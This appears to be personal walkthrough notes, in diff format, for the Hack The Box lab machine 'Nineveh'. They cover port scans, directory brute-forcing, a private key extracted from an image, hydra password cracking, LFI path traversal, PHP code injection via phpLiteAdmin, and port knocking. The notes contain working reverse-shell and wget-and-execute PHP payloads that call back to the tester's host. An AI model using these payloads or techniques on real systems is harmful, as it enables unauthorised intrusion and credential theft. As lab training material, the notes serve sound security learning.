@@ -1,0 +1,910 @@
+RECON
+root@kali:~/htb/nineveh# nmap -sC -sV -p- -vv -oA full 10.10.10.43
+PORT    STATE SERVICE  REASON         VERSION
+80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens
+| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-07-01T15:03:30
+| Not valid after:  2018-07-01T15:03:30
+| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
+| SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
+| -----BEGIN CERTIFICATE-----
+| MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
+| VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
+| BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu
+| aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN
+| MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN
+| BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl
+| Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx
+| IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2
+| WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp
+| eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO
+| GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C
+| U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi
+| AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV
+| HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy
+| OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma
+| AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U
+| qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4
+| Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d
+| 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1
+| CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb
+| KrYQgX28Ulf8OSGJuA==
+|_-----END CERTIFICATE-----
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+| tls-alpn: 
+|   http/1.1
+
+VULN SCAN
+root@kali:~/htb/nineveh# nmap -Pn --script vuln 10.10.10.43
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-13 18:01 EST
+Nmap scan report for 10.10.10.43
+Host is up (0.020s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /info.php: Possible information file
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+443/tcp open  https
+| http-cookie-flags: 
+|   /db/: 
+|     PHPSESSID: 
+|       secure flag not set and HTTPS in use
+|_      httponly flag not set
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /db/: BlogWorx Database
+|_  /db/: Potentially interesting folder
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_sslv2-drown: 
+
+ENUM WEB
+root@kali:~/htb/nineveh# nikto -h http://10.10.10.43
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.43
++ Target Hostname:    10.10.10.43
++ Target Port:        80
++ Start Time:         2020-11-13 17:15:55 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0xb2 0x5535e4e04002a 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ /info.php: Output from the phpinfo() function was found.
++ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
++ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
++ 7499 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2020-11-13 17:21:00 (GMT-5) (305 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@kali:~/htb/nineveh# uniscan -u 10.10.10.43 -qweds
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 13-11-2020 21:5:59
+===================================================================================================
+| Domain: http://10.10.10.43/
+| Server: Apache/2.4.18 (Ubuntu)
+| IP: 10.10.10.43
+===================================================================================================
+|
+| Directory check:
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://10.10.10.43/index.html
+| [+] CODE: 200 URL: http://10.10.10.43/info.php
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| [+] Crawling finished, 0 URL's found!
+|
+| External hosts:
+|
+| Source Code Disclosure:
+|
+| Timthumb:
+|
+| File Upload Forms:
+|
+| FCKeditor File Upload:
+|
+| E-mails:
+| [+] E-mail Found: license@php.net
+|
+| Web Backdoors:
+|
+| PHPinfo() Disclosure:
+| [+] phpinfo() page: http://10.10.10.43/info.php
+| 	System: Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 
+| 	PHP version: 7.0.18-0ubuntu0.16.04.1 
+| 	Apache Version: Apache/2.4.18 (Ubuntu) 
+| 	Server Administrator: webmaster@localhost 
+| 	User/Group: www-data(33)/33 
+| 	Server Root: /etc/apache2 
+| 	DOCUMENT_ROOT: /var/www/html 
+| 	SCRIPT_FILENAME: /var/www/html/info.php 
+| 	allow_url_fopen: Off
+| 	allow_url_include: On
+| 	disable_functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
+| 	OpenSSL Library Version: OpenSSL 1.0.2g  1 Mar 2016 
+
+BRUTE FORCE DIRECTORY
+root@kali:~/htb/nineveh# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e "js,html,txt,php,jpg" -f -t 50 -u https://10.10.10.43
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: js, html, txt, php, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543640
+
+Error Log: /root/dirsearch/logs/errors-20-11-13_20-43-12.log
+
+Target: https://10.10.10.43/
+
+Output File: /root/dirsearch/reports/10.10.10.43/_20-11-13_20-43-12.txt
+
+[20:43:12] Starting: 
+[20:43:17] 403 -  293B  - //icons/
+[20:43:19] 200 -   49B  - //index.html
+[20:43:30] 301 -  309B  - //db  ->  https://10.10.10.43/db/
+[20:43:30] 200 -   11KB - //db/
+[21:15:15] 403 -  301B  - //server-status/
+[21:15:15] 403 -  300B  - //server-status
+[21:15:19] 301 -  319B  - //secure_notes  ->  https://10.10.10.43/secure_notes/
+[21:15:19] 200 -   71B  - //secure_notes/
+
+root@kali:~/htb/nineveh# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e "js,html,txt,php,jpg" -f -t 50 -u http://10.10.10.43
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: js, html, txt, php, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543640
+
+Error Log: /root/dirsearch/logs/errors-20-11-13_20-39-23.log
+
+Target: http://10.10.10.43/
+
+Output File: /root/dirsearch/reports/10.10.10.43/_20-11-13_20-39-23.txt
+
+[20:39:23] Starting: 
+[20:39:24] 200 -  178B  - //index.html
+[20:39:26] 403 -  292B  - //icons/
+[20:39:26] 200 -   83KB - //info.php
+[20:40:11] 200 -   68
+B  - //department/
+[20:40:12] 301 -  315B  - //department  ->  http://10.10.10.43/department/
+[21:04:11] 403 -  299B  - //server-status
+[21:04:11] 403 -  300B  - //server-status/
+
+DISCOVER CONTENTS HIDDEN IN SECRET NOTES PAGE BY INSPECTING IMAGE WITH STRINGS
+TO CHANGE USER CHECK IMAGE FROM SECRET_NOTES
+strings nineveh.png
+secret/
+0000755
+0000041
+0000041
+00000000000
+13126060277
+012377
+ustar  
+www-data
+www-data
+secret/nineveh.priv
+0000600
+0000041
+0000041
+00000003213
+13126045656
+014730
+ustar  
+www-data
+www-data
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+secret/nineveh.pub
+0000644
+0000041
+0000041
+00000000620
+13126060277
+014541
+ustar  
+www-data
+www-data
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
+
+BRUTE FORCE PASSWORD FOR DEPARTMENT LOGIN
+root@kali:~/htb/nineveh# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V
+[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
+1 of 1 target successfully completed, 1 valid password found
+
+LFI POSSIBLE ON THIS PAGE
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
+
+BRUTEFORCE LOGIN TO PHPLITEADMIN AS DEFAULT PASSWORD ADMIN NOT SET
+root@kali:~/htb/nineveh# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -S -s 443
+[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
+1 of 1 target successfully completed, 1 valid password found
+
+SEARCHSPLOIT PHPLITEADMIN
+root@kali:~/htb/nineveh# searchsploit phpliteadmin
+------------------------------------------------------ ----------------------------------------
+ Exploit Title                                        |  Path
+                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------ ----------------------------------------
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection        | exploits/php/webapps/24044.txt
+phpLiteAdmin - 'table' SQL Injection                  | exploits/php/webapps/38228.txt
+phpLiteAdmin 1.1 - Multiple Vulnerabilities           | exploits/php/webapps/37515.txt
+phpLiteAdmin 1.9.6 - Multiple Vulnerabilities         | exploits/php/webapps/39714.txt
+------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+
+REVIEW PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
+
+USE PENTEST MONKEY PHP REVERSE SHELL 
+root@kali:~/htb/nineveh# cp /usr/share/webshells/php/php-reverse-shell.php .
+root@kali:~/htb/nineveh# cp rshell.php rshell.txt
+
+OR ADD THIS PHP COMMAND AS A TEXT FILE
+
+<?php $sock=fsockopen("10.10.14.8",1234); exec("/bin/sh -i <&3 >&3 2>&3");?>
+
+<?php system("wget 10.10.14.8/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
+
+CREATE DATABASE
+
+CREATE TABLE IN DATABASE AND ADD PHP COMMAND
+https://10.10.10.43/db/index.php?action=table_create&confirm=1
+Table 'rshell' has been created.
+CREATE TABLE 'rshell' ('rshell' TEXT default '<?php system("wget http://10.10.14.8/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>')
+
+NEED TO USE DATABASE PATH TO PERFORM LFI
+Database name: shell.php
+Path to database: /var/tmp/shell.php
+Size of database: 2 KB
+Database last modified: 9:23am on November 14, 2020
+SQLite version: 3.11.0
+SQLite extension [?]: PDO
+PHP version: 7.0.18-0ubuntu0.16.04.1
+
+
+TRIGGER REVERSE SHELL USING LFI ON DEPARTMENT SITE (REQUIRE TWEAKING THE PATH)
+http://10.10.10.43/department/manage.php?notes=/ninevehNotes../../var/tmp/shell.php
+
+
+GET REVERSE SHELL
+root@kali:~/htb/nineveh# nc -lvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.8] from nineveh.htb [10.10.10.43] 55738
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ uname -ar
+Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+$ ifconfig
+ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:1e:66  
+          inet addr:10.10.10.43  Bcast:10.10.10.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5670625 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4594398 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1442034312 (1.4 GB)  TX bytes:2427729321 (2.4 GB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:21191 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:21191 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:1709034 (1.7 MB)  TX bytes:1709034 (1.7 MB)
+
+UPGRADE SHELL
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@nineveh:/var/www/html/department$ 
+
+ENUMERATE WITH LINENUM
+$ cd /tmp
+$ wget 10.10.14.8/line.sh
+--2020-11-14 10:19:18--  http://10.10.14.8/line.sh
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'line.sh'
+
+     0K .......... .......... .......... .......... .....     100%  104K=0.4s
+
+2020-11-14 10:19:19 (104 KB/s) - 'line.sh' saved [46631/46631]
+
+$ ls -l
+total 60
+-rw-r--r-- 1 www-data www-data 46631 Nov 14 10:05 line.sh
+-rw-r--r-- 1 www-data www-data    77 Nov 14 08:15 shell.php
+drwx------ 3 root     root      4096 Nov 13 15:56 systemd-private-aab4257d5d234644aea4828b96d681bf-systemd-timesyncd.service-PS3Yre
+drwx------ 2 root     root      4096 Nov 13 15:57 vmware-root
+$ chmod 744 line.sh
+$ ./line.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Sat Nov 14 10:20:00 CST 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
+NAME="Ubuntu"
+VERSION="16.04.2 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.2 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+
+[-] Hostname:
+nineveh
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Sat Aug  5 10:16:49 -0500 2017
+amrois           pts/0    192.168.0.14     Mon Jul  3 00:19:59 -0500 2017
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 3028 Feb 15  2017 /etc/adduser.conf
+-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
+-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 7788 Jul  2  2017 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
+-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 2192 Aug  5  2017 /etc/sysctl.conf
+-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
+-rw-r--r-- 1 root root 703 May  5  2015 /etc/logrotate.conf
+-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf
+-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 354 Aug  5  2017 /etc/knockd.conf
+-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
+-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
+-rw-r--r-- 1 root root 2583 Jul  2  2017 /etc/gai.conf
+-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
+-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
+-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
+-rw-r--r-- 1 root root 350 Jul  2  2017 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
+-rw-r--r-- 1 root root 6816 Nov 29  2016 /etc/overlayroot.conf
+-rw-r--r-- 1 root root 144 Jul  2  2017 /etc/kernel-img.conf
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/amrois/.bash_history
+
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw------- 1 root shadow 641 Jul  3  2017 /var/backups/gshadow.bak
+-rw------- 1 root shadow 1068 Jul  3  2017 /var/backups/shadow.bak
+-rw------- 1 root root 1617 Jul  2  2017 /var/backups/passwd.bak
+-rw------- 1 root root 771 Jul  3  2017 /var/backups/group.bak
+
+
+[-] Any interesting mail in /var/mail:
+total 12
+drwxrwsr-x  2 root   mail 4096 Jul  2  2017 .
+drwxr-xr-x 14 root   root 4096 Jul  2  2017 ..
+-rw-r--r--  1 amrois mail  483 Jul  2  2017 amrois
+
+
+### SCAN COMPLETE ####################################
+
+REVIEW INTERESTING FILES RELATED TO PORTKNOCKING SSH
+
+$ cat /etc/knockd.conf
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens33
+
+[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+OR
+$ cat /var/mail/amrois
+From root@nineveh.htb  Fri Jun 23 14:04:19 2017
+Return-Path: <root@nineveh.htb>
+X-Original-To: amrois
+Delivered-To: amrois@nineveh.htb
+Received: by nineveh.htb (Postfix, from userid 1000)
+        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+To: amrois@nineveh.htb
+From: root@nineveh.htb
+Subject: Another Important note!
+Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
+Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+
+Amrois! please knock the door next time! 571 290 911
+
+RUN NMAP TO OPEN SSH VIA PORT KNOCKING
+root@kali:~/htb/nineveh# for x in 571 290 911 22; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-14 12:05 EST
+Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up.
+
+PORT    STATE    SERVICE
+571/tcp filtered umeter
+
+Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-14 12:05 EST
+Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up.
+
+PORT    STATE    SERVICE
+290/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-14 12:05 EST
+Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up.
+
+PORT    STATE    SERVICE
+911/tcp filtered xact-backup
+
+Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-14 12:05 EST
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up (0.026s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
+root@kali:~/htb/nineveh# nmap -p 22 10.10.10.43
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-14 12:05 EST
+Nmap scan report for nineveh.htb (10.10.10.43)
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
+
+LOGIN VIA SSH USER AMROIS
+root@kali:~/htb/nineveh# ssh -i nineveh.key amrois@10.10.10.43
